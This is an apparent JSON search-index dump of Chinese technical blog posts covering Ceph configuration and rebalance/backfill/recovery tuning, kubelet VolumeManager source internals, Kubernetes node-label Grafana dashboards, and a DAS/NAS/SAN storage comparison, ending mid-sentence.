按顺序包含的默认ceph配置文件位置\n$CEPH_CONF环境变量指定的文件路径路径\n-c /path/ceph.conf 使用-c的命令行选项传递给ceph各应用程序或守护进程的命令行选项\n/etc/ceph/ceph.conf\n~/.ceph/config\n./ceph.conf 用户当前工作目录\n在配置文件配置时，还可以使用元变量来引用配置文件中的其他信息或引用ceph集群中的元数据信息做变量替换的。称作元参数或元变量\n常用的元参数\ncluster: 当前Ceph集群的名称 $type: 当前服务的类型名称，可能会展开为OSD或mon $id: 进程的标识符，例如对osd.0来说，其标识符为0 $host：守护进程所在的主机的主机名 $name: 其值为$type.$id 进程的运行时配置\n在进程的运行当中，设定osd、mon、mgr等工作特性。\n要查看运行时配置，请登录Ceph节点并执行：\nceph daemon {daemon-type}.{id} config show 获取帮助信息\nceph daemon {daemon-type}.{id} help 在运行时获取特定配置设置\nceph daemon {daemon-type}.{id} config get {parameter} # 例如： ceph daemon osd.0 config get public_addr 在运行时设置特定配置\n设置运行时配置有两种常用方法：\n使用Ceph mmonitor ceph tell {daemon-type}.{daemon id or *} injectargs --{name} {value} [--{name}} {value}] 例如：ceph tell osd.0 injectargs '--debug-osd 0/5' 使用 administration socket ceph daemon {daemon-type}.{id} set {name} {type} 例如：ceph osd.0 config set debug_osd 0/5 ","permalink":"https://www.oomkill.com/2023/09/11-1-ceph-common-cmd/","summary":"","title":"ceph常用命令"},{"content":"Rebalance 当 Ceph 集群在扩容/缩容后，Ceph会更新 Cluster map, 在更新时会更新 Cluster map 也会更新 “对象的放置” CRUSH 会平均但随机的将对象放置在现有的 OSD 之上，在 Rebalancing 时，只有少量数据进行移动而不是全部数据进行移动，直到达到 OSD 与 对象 之间的平衡，这个过程就叫做 Ceph 的 Rebalance。\n需要注意的是，当集群中的 OSD 数量越多，那么在做 Rebalance 时所移动的就越少。例如，在具有 50 个 OSD 的集群中，在添加 OSD 时可能会移动 1/50th 或 2% 的数据。\n如下图所示，当前集群有两个 OSD，当在集群中添加一个 OSD，使其数量达到3时，这个时候会触发 Rebalance，所移动的数量为 OSD1 上的 PG3 与 OSD2 上的 PG 6和9\n图：Ceph Rebalancing 示意图 Source：https://access.redhat.com/documentation/zh-cn/red_hat_ceph_storage/4/html/architecture_guide/ceph-rebalancing-and-recovery_arch\nBalancer 执行 Rebalance 的模块时 Balancer，其可以优化 OSD 上的放置组 (PG) ，以实现平衡分配。\n可以通过命令查看 balancer 的状态\nceph balancer status https://docs.ceph.com/en/latest/rados/operations/balancer/\nBackfill Ceph 回填 (Backfill) 指的是每当删除 OSD 时，Ceph 都会使用 “Backfill” 和 “recovery” 来重新 rebalance 存储集群。这样做是为了根据PG 策略保留数据的多个副本。这两个操作都会占用系统资源，因此当 Ceph 存储集群处于负载状态时，Ceph 的性能将会下降，因为 Ceph 将资源转移到 “回填” 和 “恢复” 过程。\n有时为了在删除 OSD 时保持 Ceph 存储可接受的性能，需要先降低 “Backfill” 和 “recovery” 操作的优先级。降低优先级的代价是，较长时间内的数据副本较少，这将会导致数据面临风险。\n回填和恢复的发生是发生在 OSD/节点 故障或新增时被触发，如果所有的回填同时发生，会对OSD带来很大的负载，这个现象叫做 ”雷群效应“ (\u0026ldquo;thundering herd\u0026rdquo; effect)\nConfigration backfill paramter 回填的参数通常位于 OSD 参数下，在 Ceph OSD 中关于 backfill [1] 的参数如下：\n参数 类型 默认值 说明 osd_max_backfills uint 1 允许回填到单个 OSD 或从单个 OSD 回填的最大数量。请注意，这对于读和写操作是分开应用的。 osd_backfill_scan_min int 64 每次回填扫描的最小对象数 osd_backfill_scan_max int 512 每次回填扫描的最大对象数 osd_backfill_retry_interval float 30.0 重试回填请求之前等待的秒数。 查看当前参数\n查看配置之前需要确定 OSD 所在的节点，例如 OSD.1 可以通过 ceph osd tree 获取所有 OSD 列表\n$ ceph osd tree ID CLASS WEIGHT TYPE NAME STATUS REWEIGHT PRI-AFF -1 13.09845 root default -3 4.36615 host PMX1 0 nvme 0.72769 osd.0 up 1.00000 1.00000 1 nvme 0.72769 osd.1 up 1.00000 1.00000 2 nvme 0.72769 osd.2 up 1.00000 1.00000 3 nvme 0.72769 osd.3 up 1.00000 1.00000 4 nvme 0.72769 osd.4 up 1.00000 1.00000 5 nvme 0.72769 osd.5 up 1.00000 1.00000 -5 4.36615 host PMX2 6 nvme 0.72769 osd.6 up 1.00000 1.00000 7 nvme 0.72769 osd.7 up 1.00000 1.00000 8 nvme 0.72769 osd.8 up 1.00000 1.00000 9 nvme 0.72769 osd.9 up 1.00000 1.00000 10 nvme 0.72769 osd.10 up 1.00000 1.00000 11 nvme 0.72769 osd.11 up 1.00000 1.00000 -7 4.36615 host PMX3 12 nvme 0.72769 osd.12 up 1.00000 1.00000 13 nvme 0.72769 osd.13 up 1.00000 1.00000 14 nvme 0.72769 osd.14 up 1.00000 1.00000 15 nvme 0.72769 osd.15 up 1.00000 1.00000 16 nvme 0.72769 osd.16 up 1.00000 1.00000 17 nvme 0.72769 osd.17 up 1.00000 1.00000 在拿到 OSD 坐在节点可以通过下面命令查看对应的 OSD 配置\n$ ceph daemon osd.1 config get osd_max_backfills { \u0026quot;osd_max_backfills\u0026quot;: \u0026quot;1\u0026quot; } $ ceph daemon osd.1 config get osd_recovery_max_active { \u0026quot;osd_recovery_max_active\u0026quot;: \u0026quot;0\u0026quot; } 接下来可以根据 OSD 类型(SSD, HDD, nvme) 的不同，来相应的调整，例如 NVMes 比 HDD 更好的性能，那么可以设置大的回填\nceph config show osd.0 osd_recovery_max_active ceph config set osd osd_max_backfills 16 Recovery 如果 Ceph OSD 守护进程崩溃并重新上线，通常这个OSD会与 PG 中包含更新版本对象的其他 Ceph OSD 守护进程不同步。发生这种情况时，Ceph OSD 守护进程会进入恢复模式 (Recovery)，并寻求获取最新的数据副本并使其映射恢复到最新状态。根据 Ceph OSD daemon 关闭的时间长短，OSD 的对象和 PG 可能会明显过时。此外，如果一个故障域（机架）发生故障，多个 Ceph OSD 守护进程可能会同时恢复在线状态。这会使恢复过程耗时且占用资源。\n为了维持操作性能，Ceph 在执行恢复时限制恢复请求数量、线程和对象块大小，这使得 Ceph 在降级状态下也能良好运行。\n恢复的参数通常位于 OSD 参数下，在 Ceph OSD 中关于 recovery [2] 的参数如下：\n参数 类型 默认值 说明 osd_recovery_delay_start float 0.0 peer互连完成后，Ceph 将延迟指定的秒数，然后再开始恢复 RADOS 对象。 osd_recovery_max_active uint 0 每个 OSD 一次的活动恢复请求数。更多请求将加速恢复，但请求会增加集群的负载 osd_recovery_max_active_hdd uint 3 如果主设备是旋转设备（HDD），则每个 OSD 一次的活动恢复请求数。 osd_recovery_max_active_ssd uint 10 如果主设备是非旋转设备（即 SSD），则每个 OSD 一次的活动恢复请求数。 osd_recovery_max_chunk size 8Mi 恢复操作可以携带的数据块的最大总大小，需要注意单位。 osd_recovery_max_single_start uint 1 当 OSD (daemon)恢复时，每个 OSD 新启动的恢复操作的最大数量。 osd_recovery_sleep float 0.0 在下一次“恢复”或“回填”操作之前休眠的时间（以秒为单位）。增加此值将减慢恢复操作，而客户端操作受影响较小。 osd_recovery_sleep_hdd float 0.1 HDD 下次恢复或回填操作之前的睡眠时间（以秒为单位）。 osd_recovery_sleep_ssd float 0.0 SSD 下一次恢复或回填操作之前的睡眠时间（以秒为单位）。 osd_recovery_sleep_hybrid float 0.025 当 OSD 数据位于 HDD 上并且 OSD 日志/WAL+DB 位于 SSD 上时，在下一次恢复或回填操作之前休眠的时间（以秒为单位）。 osd_recovery_priority uint 5 为恢复工作队列设置的默认优先级。与 Pool 无关 Ceph backfill 和 recovery 也可以在 Ceph dashboard 中进行配置\n异步恢复 在 Nautilus 版本之前 “恢复” 动作是同步的，同步最显著的一个特征就是 “同步时会阻止对 RADOS 对象的写入，直到恢复为止”。\n回填操作与恢复操作有些不同，回填会临时分配不同的活动集(Active set, PG的一个属性)，并回填活动集之外的 OSD 来允许继续写入\n而为了避免 “同步恢复” 的问题 Ceph 提供了一种可以异步恢复的配置，当异步恢复发生时，对活动集成员可继续写入，有关于更多的异步说明，可以参考 Ceph 文档 asynchronous recovery 部分\nReference [1] backfilling\n[2] recovery\n[3] ASYNCHRONOUS RECOVERY\n[4] Advantages and Disadvantages of SAN\n","permalink":"https://www.oomkill.com/2023/09/6-1-ceph-rebalance/","summary":"","title":"Ceph重新平衡 - Rebalance"},{"content":"Overview 阅读完本文，您当了解\nKubernetes 卷 CephFS 在 kubernetes 中的挂载 Kubelet VolumeManager 本文只是个人理解，如果有大佬觉得不是这样的可以留言一起讨论，参考源码版本为 1.18.20，与高版本相差不大\nVolumeManager VolumeManager VM 是在 kubelet 启动时被初始化的一个异步进程，主要是维护 “Pod\u0026quot; 卷的两个状态，”desiredStateOfWorld“ 和 ”actualStateOfWorld“； 这两个状态用于将节点上的卷 “协调” 到所需的状态。\nVM 实际上包含三个 “异步进程” (goroutine)，其中有一个 reconciler 就是用于协调与挂载的，下面就来阐述 VM 的挂载过程。\nVM中的重要组件 actualStateOfWorld mountedPod desiredStateOfWorld VolumeToMount podToMount VM的组成 VM 的代码位于，由图可以看出，主要包含三个重要部分：\nreconciler：协调器 populator：填充器 cache：包含 ”desiredStateOfWorld“ 和 ”actualStateOfWorld“ 图：VM的目录组成 在代码结构上，volumeManager 如下所示\n// volumeManager implements the VolumeManager interface type volumeManager struct { // DesiredStateOfWorldPopulator 用来与 API 服务器通信以获取 PV 和 PVC 对象的 API 客户端 kubeClient clientset.Interface // VolumePluginMgr 是用于访问 VolumePlugin 插件的 VolumePlugin 管理器。它必须预初始化。 volumePluginMgr *volume.VolumePluginMgr // desiredStateOfWorld 是一个数据结构，包含根据 VM 所需的状态：即应附加哪些卷以及 \u0026quot;哪些pod” 正在引用这些卷。 // 使用 kubelet pod manager 根据 world populator 的所需状态填充数据结构。 desiredStateOfWorld cache.DesiredStateOfWorld // 与 desiredStateOfWorld 相似，是实际状态：即哪些卷被 attacted 到该 Node 以及 volume 被 mounted 到哪些 pod。 // 成功完成 reconciler attach,detach, mount, 和 unmount 操作后，将填充数据结构。 actualStateOfWorld cache.ActualStateOfWorld // operationExecutor 用于启动异步 attach,detach, mount, 和 unmount 操作。 operationExecutor operationexecutor.OperationExecutor // reconciler reconciler 运行异步周期性循环，通过使用操作执行器触发 attach,detach, mount, 和 unmount操作 // 来协调 desiredStateOfWorld 与 actualStateOfWorld。 reconciler reconciler.Reconciler // desiredStateOfWorldPopulator 运行异步周期性循环以使用 kubelet Pod Manager 填充desiredStateOfWorld。 desiredStateOfWorldPopulator populator.DesiredStateOfWorldPopulator // csiMigratedPluginManager keeps track of CSI migration status of plugins csiMigratedPluginManager csimigration.PluginManager // intreeToCSITranslator translates in-tree volume specs to CSI intreeToCSITranslator csimigration.InTreeToCSITranslator } VM的初始化 入口：“volumeManager”(vm) 的 初始化 操作发生在 kubelet Run 时被作为一个异步进程启动。 VM 初始化： 如代码1所示，VM在初始化阶段创建了两个 cache 对象 “desiredStateOfWorld”（dsw）和“actualStateOfWorld”（asw）以及一个 “operationExecutor”，用于启动异步的线程操作 attach,detach, mount, 和 unmount 如代码2所示：VM在初始化阶段还创建了 “desiredStateOfWorldPopulator” (dswp) 与 “reconciler” “reconciler” 通过使用上面的 “operationExecutor” 触发 attach,detach, mount 和 unmount来协调 dsw 与 asw 代码1\nvm := \u0026amp;volumeManager{ kubeClient: kubeClient, volumePluginMgr: volumePluginMgr, desiredStateOfWorld: cache.NewDesiredStateOfWorld(volumePluginMgr), actualStateOfWorld: cache.NewActualStateOfWorld(nodeName, volumePluginMgr), operationExecutor: operationexecutor.NewOperationExecutor(operationexecutor.NewOperationGenerator( kubeClient, volumePluginMgr, recorder, checkNodeCapabilitiesBeforeMount, blockVolumePathHandler)), } 代码2：\nvm.intreeToCSITranslator = intreeToCSITranslator vm.csiMigratedPluginManager = csiMigratedPluginManager vm.desiredStateOfWorldPopulator = populator.NewDesiredStateOfWorldPopulator( kubeClient, desiredStateOfWorldPopulatorLoopSleepPeriod, desiredStateOfWorldPopulatorGetPodStatusRetryDuration, podManager, podStatusProvider, vm.desiredStateOfWorld, vm.actualStateOfWorld, kubeContainerRuntime, keepTerminatedPodVolumes, csiMigratedPluginManager, intreeToCSITranslator) vm.reconciler = reconciler.NewReconciler( kubeClient, controllerAttachDetachEnabled, reconcilerLoopSleepPeriod, waitForAttachTimeout, nodeName, vm.desiredStateOfWorld, vm.actualStateOfWorld, vm.desiredStateOfWorldPopulator.HasAddedPods, vm.operationExecutor, mounter, hostutil, volumePluginMgr, kubeletPodsDir) VM 的 Run VM 是在 Kubelet 启动时作为异步线程启动，如代码1所示\n如下面代码2所示，VM 在运行时会启动 三个 异步线程\n第一个调用是 第二个是调用 “dswp” 填充其的“ Run ”，这里主要做的操作是从 API 拿到 Pod 列表，根据对应条件来决定 attach,detach, mount, 和 unmount 第二个调用的是，reconciler 来协调应该安装的卷是否已安装以及应该卸载的卷是否已卸载。 第三个调用的是，volumePluginMgr，启用 CSI informer 代码1\n// Start volume manager go kl.volumeManager.Run(kl.sourcesReady, wait.NeverStop) 代码2\nfunc (vm *volumeManager) Run(sourcesReady config.SourcesReady, stopCh \u0026lt;-chan struct{}) { defer runtime.HandleCrash() go vm.desiredStateOfWorldPopulator.Run(sourcesReady, stopCh) klog.V(2).Infof(\u0026quot;The desired_state_of_world populator starts\u0026quot;) klog.Infof(\u0026quot;Starting Kubelet Volume Manager\u0026quot;) go vm.reconciler.Run(stopCh) metrics.Register(vm.actualStateOfWorld, vm.desiredStateOfWorld, vm.volumePluginMgr) if vm.kubeClient != nil { // start informer for CSIDriver vm.volumePluginMgr.Run(stopCh) } \u0026lt;-stopCh klog.Infof(\u0026quot;Shutting down Kubelet Volume Manager\u0026quot;) } VM 的调用流程 desiredStateOfWorldPopulator DesiredStateOfWorldPopulator 是一个周期 Loop，会定期循环遍历 Active Pod 列表，并确保每个 Pod 都处于所需状态（如果有卷，World state）。它还会验证 World cache 中处于所需状态的 pod 是否仍然存在，如果不存在，则会将其删除。\ndesiredStateOfWorldPopulator 结构包含两个方法，ReprocessPod 和 HasAddedPods；ReprocessPod 负责将 processedPods 中指定 pod 的值设置为false，强制重新处理它。这是在 Pod 更新时启用重新挂载卷所必需的。而 HasAddedPods 返回 填充器 是否已循环遍历 Active Pod 列表并将它们添加到 world cache 的所需状态。\n在期待填充器 desiredStateOfWorldPopulator 启动时，会运行一个 populatorLoop，这里主要负责运行两个函数，\nfindAndAddNewPods 负责迭代所有 pod，如果它们不存在添加到 desired state of world (desiredStateOfWorld) findAndRemoveDeletedPods 负责迭代 desiredStateOfWorld 下的所有 Pod，如果它们不再存在则将其删除 reconciler reconciler Run 的过程是通过一个 Loop 函数 reconciliationLoopFunc 完成的，正如下列 代码 所示\nfunc (rc *reconciler) Run(stopCh \u0026lt;-chan struct{}) { wait.Until(rc.reconciliationLoopFunc(), rc.loopSleepDuration, stopCh) } func (rc *reconciler) reconciliationLoopFunc() func() { return func() { rc.reconcile() // Sync the state with the reality once after all existing pods are added to the desired state from all sources. // Otherwise, the reconstruct process may clean up pods' volumes that are still in use because // desired state of world does not contain a complete list of pods. if rc.populatorHasAddedPods() \u0026amp;\u0026amp; !rc.StatesHasBeenSynced() { klog.Infof(\u0026quot;Reconciler: start to sync state\u0026quot;) rc.sync() } } } func (rc *reconciler) reconcile() { // Unmounts are triggered before mounts so that a volume that was // referenced by a pod that was deleted and is now referenced by another // pod is unmounted from the first pod before being mounted to the new // pod. // 卸载会在挂载之前触发，以便已删除的 Pod 引用的卷现在被另一个 Pod 引用， // 然后再挂载到新 Pod 之前从第一个 Pod 中卸载。 rc.unmountVolumes() // Next we mount required volumes. This function could also trigger // attach if kubelet is responsible for attaching volumes. // If underlying PVC was resized while in-use then this function also handles volume // resizing. // 接下来我们安装所需的卷。如果 kubelet 负责附加卷， // 则此函数还可以触发附加。如果底层 PVC 在使用时调整了大小，则此函数还可以处理卷大小调整。 rc.mountAttachVolumes() // Ensure devices that should be detached/unmounted are detached/unmounted. // 确保应 detached/unmounted 的设备已完成 detached/unmounted。 rc.unmountDetachDevices() } Reconciler 是挂载部分最重要的角色，用于协调应该安装的卷是否已安装以及应该卸载的卷是否已卸载；对应的，实际上执行的为三个函数：“unmountVolumes”、“mountAttachVolumes” 和 “unmountDetachDevices”。\nmountAttachVolumes 首先，“mountAttachVolumes” 会调用 “dsw” (desiredStateOfWorld) 的函数 “GetVolumesToMount” 来检索所有 “volumesToMount” 并迭代它们，这里主要是为了确保 “volumes” 应完成了 “attached/mounted”\n接下来这个循环做的工作是，对于每个 Volume 和 Pod，都会检查该 Volume 或 Pod 是否存在于 “asw” 的 “attachedVolumes” 中。如果 Volume 不存在，则“asw”返回 “newVolumeNotAttachedError ”，否则它检查指定的 pod 是否存在并根据状态返回结果。这里存在 三个状态，返回也是根据这个状态返回。这里主要为了得到挂载路径和是否挂载\nVolumeMounted：表示 Volume 已挂载到 pod 的本地路径中\nVolumeMountUncertain：表示 Volume 可能会也可能不会安装在 Pod 的本地路径中\nVolumeNotMounted：表示 Volume 还未挂载到 pod 的本地路径中\n当“ asw” 返回 “ newVolumeNotAttachedError ” 时，“reconciler” 会检查 “controllerAttachDetachEnabled” 是否启用，或 “volumeToMount” 没有实现了对应插件，这里面如果其中任何一个为 true，“reconciler” 将调用 “operationExecutor” 来执行操作“ ，走到这里代表了 Volume 没有被 attach，或者没有实现 attacher，例如 cephfs 没有实现 attacher；或者是 kubelet 禁用了 attach [1] （默认是开启状态），将进入 “ VerifyControllerAttachedVolume ”\n在此期间，“operationExecutor” 生成一个名为 “verifyControllerAttachedVolumeFunc” 的函数来实际实现。在此函数中，如果 “volumeToMount” 的 “PluginIsAttachable” 为 false（没有实现），则假设其已经实现并标记 attached，标记出错时进行重试（这是一个函数用于后面的调用，这里只是定义）\n如果还没有将 Node attached 到 Volume 节点列表状态中，则返回错误进行重试（这是一个函数用于后面的调用，这里只是定义）\n上面两个步骤是为了组装这个操作，返回的是操作的内容，包含执行的函数，完成的hook等，最后运行这个函数并返回\n这是步骤3的另外一个分支，即 kubelet 启用了 ADController，并且实现了对应的 attcher，那么将执行附加操作\n拼接对象 执行函数 ”AttachVolume“ AttachVolume 如上面步骤一样，拼接出最后的执行的动作，进行执行操作（将 node 附加到 volume 之上） 步骤5 表示 3, 4 条件均不满足，也就是 Attached，目前状态为 ”未挂载“ 或者 ”已挂载“，将执行这个步骤，未挂载的进行挂载，已挂载的进行 remount\n在该分支中（也就是 步骤5 执行的）执行的是名为 “GenerateMountVolumeFunc“ 的函数，在此函数中，会获取 Plugin ，并通过 Plugin 创建出一个 volumeMounter，在通过 Plugin 获取一个 deviceMouter（能够挂载块设备的）；当然我们这里挂载的是 ”cephfs“ 所以没有 ”deviceMouter“ 这里不被执行。\n如果 ”deviceMounter“ 定义了，那么则执行这个 plugin 的 \u0026ldquo;MountDevice\u0026rdquo; 函数 如果没有定义，那么执行 volumeMounter 的 SetUp 进行挂载（因为不是块设备） 执行 SetUp 函数，通常 NFS, CephFS, HostPath，都实现了这个函数，那么就会通过这个函数挂载到 Node 对应的目录\n最后通过 Overlay2 文件系统附加到容器里\nReference [1] command-line-tools-reference kubelet\n[2] What happens when volumeManager in the kubelet starts?\n","permalink":"https://www.oomkill.com/2023/08/ch29-volumemanager/","summary":"","title":"深入理解kubelet - VolumeManager源码解析"},{"content":"背景 目前的 Kubernetes 集群资源面板是基于集群的使用资源，因为是多集群，业务同时运行字啊不同集群上，如果通过 label 来划分业务使用的资源情况，这个才是真的和每个集群的每个业务使用的资源有关。\n对于这种场景的划分，Kubernetes 中有一个专门的名词是 Pod 的拓扑域；基于这些需要做的事情就如下步骤\n首先确定node label可以搜集到，如果不存在需要收集 当收集到node label 时，需要根据对应的 label 将一个域中的 根据域（label）做变量注入到 对应的查询语句中以生成图表 收集 node label 在使用 kube-prometheus-stack 中收集 kubernetes 的 node label 需要手动启动参数 - --metric-labels-allowlist=nodes=[*] 才可以收集到 node label，手动给Node 打上标签，test 拓扑域 为 aaaa bbbb两个\n$ kubectl get node --show-labels NAME STATUS ROLES AGE VERSION LABELS node01 Ready \u0026lt;none\u0026gt; 13d v1.16.10 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=node01,kubernetes.io/os=linux,test=bbbb node01 Ready \u0026lt;none\u0026gt; 13d v1.16.10 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=node01,kubernetes.io/os=linux,test=aaaa 开启后，会在 kube_node_labels 收取到 node 的 label，其他 node label 没什么用，使用 relabeing 删除掉\nregex: label_(beta_kubernetes_io_arch|beta_kubernetes_io_os|kubernetes_io_arch|kubernetes_io_os|kubernetes_io_hostname) action: labeldrop 使用标签分组 因为标签 只存在于 kube_node_label 指标中，需要利用这个指标对每种类型 Pod 分组，首先找到指标的相同标签，可以看到每个 Pod 都会存在一个 node=\u0026ldquo;xxxxxxx\u0026rdquo; 这与 kube_node_labels 上的相符合。\nkube_pod_container_resource_requests{container=\u0026quot;alertmanager\u0026quot;, endpoint=\u0026quot;http\u0026quot;, instance=\u0026quot;10.0.130.150:8080\u0026quot;, job=\u0026quot;kube-state-metrics\u0026quot;, namespace=\u0026quot;default\u0026quot;, node=\u0026quot;node003\u0026quot;, pod=\u0026quot;alertmanager-kube-prometheus-stack-alertmanager-0\u0026quot;, resource=\u0026quot;memory\u0026quot;, service=\u0026quot;kube-prometheus-stack-kube-state-metrics\u0026quot;, uid=\u0026quot;12787588-b05e-466a-9f1a-661a05e8b634\u0026quot;, unit=\u0026quot;byte\u0026quot;} kube_node_labels{container=\u0026quot;kube-state-metrics\u0026quot;, endpoint=\u0026quot;http\u0026quot;, instance=\u0026quot;10.0.130.150:8080\u0026quot;, job=\u0026quot;kube-state-metrics\u0026quot;, label_test=\u0026quot;aaaa\u0026quot;, namespace=\u0026quot;default\u0026quot;, node=\u0026quot;node195\u0026quot;, pod=\u0026quot;kube-prometheus-stack-kube-state-metrics-7fb89968cb-jrrdp\u0026quot;, service=\u0026quot;kube-prometheus-stack-kube-state-metrics\u0026quot;} 然后使用 promQL 的 join 表达式，对应决定拓扑域的 label 注入到每个 Pod 的标签中\nkube_pod_info{node=xxx} * on(node) group_left(test) kube_node_labels{test=\u0026quot;aaa\u0026quot;} 上面的表达式中，选择了 kube_pod_info 指标，并且使用 node=xxx 进行过滤。然后使用 on(node) 语句指定在 node 标签上进行 join 操作，同时使用 group_left(test) 告诉 Prometheus 把 kube_node_labels 中的 test 标签添加到左侧的指标（即 kube_pod_info）中。\n通过这种方式，我们就可以把 kube_node_labels 中的 test=aaa 标签附加到所有 kube_pod_info 上，且它们都是在相同的节点中。具体效果如下图\n图1：node label指标 grafana 使用 label 做变量 有了决定拓扑域的标签，还需要吧这个 label 作为 grafana 的变量\n图2：grafana变量配置 这个里可以用 promql 的 by 进行分组\ncount(kube_pod_info{} * on(node) group_left(label_test) kube_node_labels{}) by (label_test) 如图1所示，这时就知道每个拓扑域中的 Pod 使用了多少资源，以及可以是用 聚合函数 算出每个拓扑域总资源等信息\n基于 kube_node_labels 作为变量进行输出面板\n图3：grafana定义变量 图4：promql ","permalink":"https://www.oomkill.com/2023/08/kubernetes-node-label-dashboard/","summary":"","title":"记录kubernetes node label的面板实施"},{"content":"存储选择需要考虑的问题：不同的文件访问方式? 在关注存储之前，需要关注下面一些问题：\n“应用” 访问数据的方式是什么？\n一次读取 或 分块读取 一个连续的“流”传输最好的方式是什么 有序的 或 随机的 “数据的类型是什么”？\n数据库，Text，视频/音频，图像\u0026hellip; 静态 / 固定 / 动态 是否需要数据共享？\n由应用共享 / 由存储共享 读 / 写 共享方面关注的问题？\nNarrow (只需要更新部分内容，这可以共享特定部分内容，这将不是一个广泛共享) / Broad 安全和访问控制：\n应用什么级别的的安全性？ 访问性会影响存储的选择：\nLocal / Network 介质：光纤，以太网，SAS，SATA，PCIe\u0026hellip; 有了这些问题，就可以引入存储的类型，以便选择最佳的存储（Balance performance and cost ）\nDAS Direct Attached Storage (DAS) 直接附加存储是指，直接连接到服务器存储系统，通俗来讲就是直接连接磁盘，服务器与存储系统之间“没有经过网络设备” (如交换机等)，服务器与存储直接由专用的“连接技术”进行连接，如 SCSI, 但现在更常见的是 “eSATA”, “SAS”, 或 “光纤通道”。\n图：DAS结构图 Source：https://www.pcmag.com/encyclopedia/term/direct-attached-storage\n图：DAS接口类型 Source：https://ramsaihan.wordpress.com/2017/10/16/the-sas-sata-scsi-and-ata-in-storage-and-peripheral-communication/\n外部连接 直连存储也可以通过连接电缆从服务器连接到存储设备，但服务器中必须存在 SAS、以太网或 FC 控制器，只有该服务器可以使用外部磁盘空间。因此直连存储也可以作为是服务器的扩展\nSAS 作为连接介质价格低廉，但距离仅限于几米（最大 5 或 10 米，具体取决于制造商）；光纤通道的传输距离可达数公里，因此也可用作灾备系统。\n许多 DAS 系统都有一个内部 RAID 控制器，这些 RAID 将作为一个逻辑磁盘呈现给服务器。这样，用小的物理磁盘也可以生产出大的逻辑硬盘。RAID 控制器的另一个优点是与单个磁盘相比，RAID 5 和 RAID 10 中的 I/O 吞吐量有所增加。\n图：外部的DAS Source：https://www.storitback.de/service/direct-attached-storage.html\nDAS的优缺点 优点：\n高可用 更好的数据安全与容错 存储容量扩展更经济 消除网络设置的复杂性 易于管理 缺点：\n有限的分享 利用率差 仅允许有限的使用者(服务器) 单设备有限的接口 表现形式 在操作系统方面表现为一个裸磁盘(块设备)，如 /dev/sda 在硬件方向表现为一个硬盘设备，如：SSD, HDD, M.2\u0026hellip; NAS Network Attached Storage (NAS) 网络附加存储是连接到网络的专用文件服务器。NAS 使用以太网和 TCP/IP 等协议，使得 NAS 能够摆脱 SCSI 技术的限制。在表现方面 NAS 是作为一个“网络节点”，也会存在一些 NAS 产品（例如 Network Appliance Filer 和 Auspex 服务器）作为存储设备。\n图：NAS的表现方式 Source：https://dreamlog.tistory.com/565\n图：NAS 与 DAS 的对比 Source：https://www.pcmag.com/encyclopedia/term/direct-attached-storage\nNAS 的优缺点 优点：\n对端口没有限制 高度的可扩展性和灵活性 便于安装和维护 多协议 缺点：\n大规模场景下性能会下降（性能取决于协议） 面向文件（文件系统） 因依赖网络，传输速率比 DAS 慢 NAS 由于“共享文件系统”，在安全性的地方会存在弊端 备份和恢复期间会造成网络拥塞 表现形式 在操作系统层面表现为“存储中的一个目录”，如 /data 协议类型：NFS, CIFS 典型产品： NFS Samba GlusterFS CephFS 公有云：EFS(AWS), CFS(tencent), NAS(Aliyun) SAN Storage Area Network (SAN) ，是一种附加远程存储的架构，使其看起来像是本地的，多用于数据中心的存储解决方案，SAN 将存储作为了可通过网络访问的单独设备，该方案融合了 DAS 和 NAS 的灵活性，也增加了配置的复杂性，通常使用与 DAS 类型的协议(SCSI, ISCSI, Fiber Channel) 连接。\n图：SAN存储结构图 Source：https://www.pcmag.com/encyclopedia/term/direct-attached-storage\nSAN 的优缺点 优点：\n可以存储大量数据 中心化管理 高度容错 支持动态扩展 快速高效的备份和恢复 缺点：\n硬件成本高(FC 交换机, FC 网络接口, HBA)，价格昂贵 因客户端是多个共享，安全性不好 维护困难 SAN 不适合数据密集型传输，更适用与低流量 依赖高速网络 表现形式 在操作系统方面表现为一个裸磁盘(块设备)，如 /dev/sda 在硬件方向表现为一个磁盘阵列服务器 DAS vs NAS vs SAN 三种存储类型在架构图上表示如下图所示：\n图：存储类型的架构对比 Source：https://dreamlog.tistory.com/565\n对比 DAS, NAS 和 SAN：\n类型 DAS NAS SAN 组成 主机 (PC/Server)+存储设备（硬盘） 主机 (PC/Server) 文件系统服务 存储设备 磁盘阵列服务器光纤交换机 存储设备 传输介质 电缆(IDE, SATA..) 以太网 光纤 + 光纤交换机 + 电缆 (IDE, SATA) 类型 块设备 文件系统 块设备 应用规模 小规模 中 大 传输速度 介质通道速度 LAN + 介质通道速度双冲因素 通道速度 NAS vs SAN 在通常情况下 NAS与 SAN 常常会进行对比，主要区别在于 SAN 是通道附加的，而 NAS 是网络附加的。\n传输协议方面，SAN 与 NAS 技术相似但又不同。SAN 传统上采用低级网络协议来传输磁盘块 NAS 设备通常通过 TCP/IP 传输文件\n设备表现方面：NAS 是对数据文件进行操作的单个存储设备，而 SAN 是对磁盘块进行操作的多个设备的本地网络。\n网络依赖方面：SAN 通常使用 iSCSI 和光纤通道互连。NAS 通常建立以太网和 TCP/IP 连接。\n性能方面：\n由于文件系统层速度较慢，NAS 通常具有较低的吞吐量和较高的延迟，但高速网络可以弥补 NAS 的性能损失。 SAN 是适用于事务数据库和电子商务网站等高流量环境的高性能设备。FC 或 NVMe 等技术有助于有效地消除此类请求。 扩展性方面：NAS可以是 DAS构成的主机，也可以是一个网络磁盘阵列服务器，通常扩展性不是很高；SAN 。其网络架构允许管理员在纵向或横向配置中扩展性能和容量\n传输协议方面：\nNAS 通过以太网交换机的网线直接连接到以太网。NAS 可以使用多种协议连接到服务器，包括 NFS、SMB/CIFS 和 HTTP。 SAN 使用 SCSI 协议或 SAN 驱动设备进行通信。网络是通过使用 SAS /SATA 连接类型或通过将层映射到其他协议来形成的，例如 FC 协议 (FCP) 协议映射 SCSI over FC 或 iSCSI映射 SCSI over TCP/IP 。 Block Storage 块存储是一种允许对低级存储设备进行抽象的技术，主要优点是提供低延迟操作。块设备视通常为常规磁盘（底层可以是 DAS 或 